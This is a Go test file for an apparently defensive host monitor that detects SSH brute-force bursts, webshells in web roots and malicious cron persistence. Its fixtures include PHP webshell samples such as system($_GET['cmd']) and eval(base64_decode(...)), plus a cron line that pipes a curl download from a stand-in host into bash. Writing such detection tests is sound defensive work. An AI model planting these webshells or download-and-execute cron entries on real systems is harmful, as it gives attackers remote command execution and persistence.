package monitor

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/ErzenXz/aegis/internal/sensors"
)

type journalRunner struct {
	output []byte
	err    error
	args   []string
}

func (r *journalRunner) Run(_ context.Context, name string, args ...string) ([]byte, error) {
	if name != "journalctl" {
		return nil, fmt.Errorf("unexpected command: %s", name)
	}
	r.args = args
	return r.output, r.err
}
func testConfig(t *testing.T, r *journalRunner) Config {
	return Config{StateDir: t.TempDir(), Runner: r, PersistencePaths: []string{}}
}
func record(cursor, message string) []byte {
	b, _ := json.Marshal(map[string]string{"__CURSOR": cursor, "MESSAGE": message, "__REALTIME_TIMESTAMP": fmt.Sprint(time.Now().UnixMicro())})
	return append(b, '\n')
}
func TestJournalBurstAndRestart(t *testing.T) {
	r := &journalRunner{}
	c := testConfig(t, r)
	m := New(c)
	var got []sensors.Observation
	for i := 0; i < 15; i++ {
		r.output = append(r.output, record(fmt.Sprint(i), "Failed password for invalid user admin from 192.0.2.1 port 42 ssh2")...)
	}
	r.output = append(r.output, record("accepted", "Accepted publickey for root from 192.0.2.1 port 42 ssh2")...)
	emit := func(o sensors.Observation) error { got = append(got, o); return nil }
	if err := m.Run(context.Background(), emit); err != nil {
		t.Fatal(err)
	}
	if len(got) != 2 || got[0].Attributes["reason"] != "ssh_failure_burst" || got[1].Attributes["reason"] != "ssh_success_after_failure_burst" {
		t.Fatalf("unexpected anomalies: %+v", got)
	}
	r.output = nil
	if err := New(c).Run(context.Background(), emit); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(strings.Join(r.args, " "), "--after-cursor=accepted") {
		t.Fatalf("restart cursor missing: %v", r.args)
	}
	fi, err := os.Stat(filepath.Join(c.StateDir, "monitor.json"))
	if err != nil || fi.Mode().Perm() != 0600 {
		t.Fatalf("state permissions: %v %v", fi, err)
	}
}
func TestEmitFailureRetainsJournalCursor(t *testing.T) {
	r := &journalRunner{}
	c := testConfig(t, r)
	for i := 0; i < 10; i++ {
		r.output = append(r.output, record(fmt.Sprint(i), "Failed password for root from 192.0.2.2 port 42 ssh2")...)
	}
	err := New(c).Run(context.Background(), func(sensors.Observation) error { return errors.New("sink down") })
	if err == nil {
		t.Fatal("expected sink error")
	}
	s, err := New(c).load()
	if err != nil {
		t.Fatal(err)
	}
	if s.Cursor != "8" {
		t.Fatalf("unacknowledged cursor committed: %q", s.Cursor)
	}
	r.output = record("9", "Failed password for root from 192.0.2.2 port 42 ssh2")
	count := 0
	if err := New(c).Run(context.Background(), func(sensors.Observation) error { count++; return nil }); err != nil {
		t.Fatal(err)
	}
	if count != 1 {
		t.Fatalf("lost retry: %d", count)
	}
}
func TestWebshellBaselineChangesAndSymlink(t *testing.T) {
	r := &journalRunner{}
	c := testConfig(t, r)
	root := t.TempDir()
	outside := t.TempDir()
	c.WebRoots = []string{root}
	if err := os.WriteFile(filepath.Join(outside, "evil.php"), []byte("<?php system($_GET['cmd']);"), 0600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, filepath.Join(root, "escape")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(outside, "evil.php"), filepath.Join(root, "linked.php")); err != nil {
		t.Fatal(err)
	}
	file := filepath.Join(root, "index.php")
	if err := os.WriteFile(file, []byte("<?php echo htmlspecialchars($_GET['q']);"), 0600); err != nil {
		t.Fatal(err)
	}
	var got []sensors.Observation
	emit := func(o sensors.Observation) error { got = append(got, o); return nil }
	if err := New(c).Run(context.Background(), emit); err != nil {
		t.Fatal(err)
	}
	if len(got) != 0 {
		t.Fatalf("legitimate PHP/symlink flagged: %+v", got)
	}
	if err := os.WriteFile(file, []byte("<?php eval(base64_decode($_POST['cmd']));"), 0600); err != nil {
		t.Fatal(err)
	}
	if err := New(c).Run(context.Background(), emit); err != nil {
		t.Fatal(err)
	}
	if len(got) != 2 || got[0].Kind != "webshell.suspicious" || len(got[0].Attributes["sha256"]) != 64 {
		t.Fatalf("missing shell evidence: %+v", got)
	}
	got = nil
	if err := New(c).Run(context.Background(), emit); err != nil {
		t.Fatal(err)
	}
	if len(got) != 0 {
		t.Fatal("unchanged file repeated")
	}
	// Existing shells must also be reported on the initial scan.
	c.StateDir = t.TempDir()
	if err := New(c).Run(context.Background(), emit); err != nil {
		t.Fatal(err)
	}
	if len(got) != 1 {
		t.Fatal("initial shell missed")
	}
}
func TestFileEmitRetryAndOversize(t *testing.T) {
	r := &journalRunner{}
	c := testConfig(t, r)
	c.WebRoots = []string{t.TempDir()}
	p := filepath.Join(c.WebRoots[0], "hack.php")
	if err := os.WriteFile(p, []byte("<?php system($_GET['cmd']);"), 0600); err != nil {
		t.Fatal(err)
	}
	if err := New(c).Run(context.Background(), func(sensors.Observation) error { return errors.New("sink") }); err == nil {
		t.Fatal("missing sink failure")
	}
	count := 0
	if err := New(c).Run(context.Background(), func(sensors.Observation) error { count++; return nil }); err != nil {
		t.Fatal(err)
	}
	if count != 1 {
		t.Fatal("shell lost on failed emit")
	}
	if err := os.WriteFile(p, make([]byte, (1<<20)+1), 0600); err != nil {
		t.Fatal(err)
	}
	if err := New(c).Run(context.Background(), func(sensors.Observation) error { return nil }); err == nil {
		t.Fatal("oversize file falsely clean")
	}
}
func TestCollectionErrorsAreVisible(t *testing.T) {
	r := &journalRunner{err: errors.New("permission denied")}
	c := testConfig(t, r)
	if err := New(c).Run(context.Background(), func(sensors.Observation) error { return nil }); err == nil {
		t.Fatal("journal denial falsely clean")
	}
	r.err = nil
	r.output = []byte("not json\n")
	if err := New(c).Run(context.Background(), func(sensors.Observation) error { return nil }); err == nil {
		t.Fatal("bad journal falsely clean")
	}
}
func TestMatchWebshell(t *testing.T) {
	for _, test := range []struct {
		code       string
		confidence float64
	}{
		{"<?php echo 'hello';", 0}, {"<?php $x = base64_decode($image);", 0}, {"<?php eval(base64_decode('abc'));", .85}, {"<?php shell_exec($_REQUEST['cmd']);", .99}, {"plain text system($_GET['x'])", 0},
	} {
		_, got := MatchWebshell([]byte(test.code))
		if got != test.confidence {
			t.Errorf("%q: %v", test.code, got)
		}
	}
}

func TestWebshellCommentsAndLiteralsIgnored(t *testing.T) {
	for _, code := range []string{
		"<?php // system($_GET['cmd']);\necho 1;",
		"<?php /* eval(base64_decode($_POST['cmd'])); */ echo 1;",
		`<?php $example = 'system($_GET["cmd"])';`,
		`<p>system($_GET['cmd'])</p><?php echo 'safe'; ?>`,
		`<?xml version="1.0"?><p>system($_GET['cmd'])</p>`,
		`<?php $safe->system($_GET['cmd']);`,
		`<?php SafeWrapper::system($_GET['cmd']);`,
		`<?php assert($_GET['cmd']);`,
	} {
		if signature, _ := MatchWebshell([]byte(code)); signature != "" {
			t.Errorf("example falsely detected: %q", code)
		}
	}
}

func TestPersistenceAndDeletedFiles(t *testing.T) {
	r := &journalRunner{}
	c := testConfig(t, r)
	root := t.TempDir()
	c.PersistencePaths = []string{root}
	path := filepath.Join(root, "cron")
	if err := os.WriteFile(path, []byte("* * * * * root /usr/bin/true\n"), 0600); err != nil {
		t.Fatal(err)
	}
	var got []sensors.Observation
	emit := func(o sensors.Observation) error { got = append(got, o); return nil }
	if err := New(c).Run(context.Background(), emit); err != nil {
		t.Fatal(err)
	}
	if len(got) != 0 {
		t.Fatal("normal initial cron flagged")
	}
	if err := os.WriteFile(path, []byte("* * * * * root curl https://example.invalid/payload | bash\n"), 0600); err != nil {
		t.Fatal(err)
	}
	if err := New(c).Run(context.Background(), emit); err != nil {
		t.Fatal(err)
	}
	if len(got) != 1 || got[0].Attributes["indicator"] != "reverse-shell-or-download-execution" {
		t.Fatalf("persistence missed: %+v", got)
	}
	if err := os.Remove(path); err != nil {
		t.Fatal(err)
	}
	got = nil
	if err := New(c).Run(context.Background(), emit); err != nil {
		t.Fatal(err)
	}
	if len(got) != 1 || got[0].Attributes["change"] != "deleted" {
		t.Fatalf("deletion missed: %+v", got)
	}
}

func TestWebshellOccurrenceRetryAndReinfection(t *testing.T) {
	r := &journalRunner{}
	c := testConfig(t, r)
	root := t.TempDir()
	c.WebRoots = []string{root}
	path := filepath.Join(root, "hack.php")
	content := []byte("<?php system($_GET['cmd']);")
	if err := os.WriteFile(path, content, 0600); err != nil {
		t.Fatal(err)
	}
	first := ""
	if err := New(c).Run(context.Background(), func(o sensors.Observation) error { first = o.Attributes["occurrenceId"]; return errors.New("retry") }); err == nil {
		t.Fatal("expected sink failure")
	}
	if len(first) != 64 {
		t.Fatalf("missing occurrence: %q", first)
	}
	var retried string
	emit := func(o sensors.Observation) error {
		if o.Kind == "webshell.suspicious" {
			retried = o.Attributes["occurrenceId"]
		}
		return nil
	}
	if err := New(c).Run(context.Background(), emit); err != nil {
		t.Fatal(err)
	}
	if retried != first {
		t.Fatalf("retry changed occurrence %q -> %q", first, retried)
	}
	info, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Rename(path, path+".evidence"); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, content, 0600); err != nil {
		t.Fatal(err)
	}
	if err := os.Chtimes(path, info.ModTime(), info.ModTime()); err != nil {
		t.Fatal(err)
	}
	retried = ""
	if err := New(c).Run(context.Background(), emit); err != nil {
		t.Fatal(err)
	}
	if retried == "" || retried == first {
		t.Fatalf("same-content reinfection missed: %q", retried)
	}
}

type cursorRecoveryRunner struct {
	replay []byte
	calls  [][]string
	denied bool
}

func (r *cursorRecoveryRunner) Run(_ context.Context, _ string, args ...string) ([]byte, error) {
	r.calls = append(r.calls, append([]string(nil), args...))
	joined := strings.Join(args, " ")
	if strings.Contains(joined, "--after-cursor=stale") {
		if r.denied {
			return nil, errors.New("Failed to seek to cursor: Permission denied")
		}
		return nil, errors.New("Failed to seek to cursor: Invalid argument")
	}
	if strings.Contains(joined, "--since=-5min") {
		return r.replay, nil
	}
	return nil, nil
}
func TestJournalStaleCursorDisclosedRecoveryAndGapEmitFailure(t *testing.T) {
	for _, failGap := range []bool{false, true} {
		t.Run(fmt.Sprint(failGap), func(t *testing.T) {
			r := &cursorRecoveryRunner{}
			for i := 0; i < 10; i++ {
				r.replay = append(r.replay, record(fmt.Sprintf("replay-%d", i), "Failed password for root from 192.0.2.88 port 42 ssh2")...)
			}
			c := Config{StateDir: t.TempDir(), Runner: r, PersistencePaths: []string{}}
			m := New(c)
			s := diskState{Cursor: "stale", Failures: map[string][]int64{}, Files: map[string]string{}}
			if err := m.save(&s); err != nil {
				t.Fatal(err)
			}
			var got []sensors.Observation
			err := m.Run(context.Background(), func(o sensors.Observation) error {
				got = append(got, o)
				if failGap && o.Kind == "sensor.coverage_gap" {
					return errors.New("sink down")
				}
				return nil
			})
			stored, loadErr := m.load()
			if loadErr != nil {
				t.Fatal(loadErr)
			}
			if failGap {
				if err == nil || stored.Cursor != "stale" || len(r.calls) != 1 {
					t.Fatalf("unacknowledged gap reset cursor: %q calls%d err%v", stored.Cursor, len(r.calls), err)
				}
				return
			}
			if err != nil {
				t.Fatal(err)
			}
			if len(got) != 2 || got[0].Kind != "sensor.coverage_gap" || got[1].Kind != "authentication.anomaly" || len(got[0].Attributes["previousCursorSha256"]) != 64 || stored.Cursor != "replay-9" {
				t.Fatalf("recovery lost evidence or cursor: %+v cursor%q", got, stored.Cursor)
			}
			if len(r.calls) != 2 || !strings.Contains(strings.Join(r.calls[1], " "), "--lines=1000") {
				t.Fatalf("recovery was not newest bounded replay: %v", r.calls)
			}
			got = nil
			if err := New(c).Run(context.Background(), func(o sensors.Observation) error { got = append(got, o); return nil }); err != nil {
				t.Fatal(err)
			}
			if len(got) != 0 {
				t.Fatal("recovered cursor did not survive restart")
			}
		})
	}
}
func TestJournalPermissionFailureNeverResetsCursor(t *testing.T) {
	r := &cursorRecoveryRunner{denied: true}
	c := Config{StateDir: t.TempDir(), Runner: r, PersistencePaths: []string{}}
	m := New(c)
	s := diskState{Cursor: "stale", Failures: map[string][]int64{}, Files: map[string]string{}}
	if err := m.save(&s); err != nil {
		t.Fatal(err)
	}
	count := 0
	if err := m.Run(context.Background(), func(sensors.Observation) error { count++; return nil }); err == nil {
		t.Fatal("permission failure hidden")
	}
	stored, err := m.load()
	if err != nil {
		t.Fatal(err)
	}
	if count != 0 || stored.Cursor != "stale" || len(r.calls) != 1 {
		t.Fatal("permission failure triggered destructive cursor recovery")
	}
}
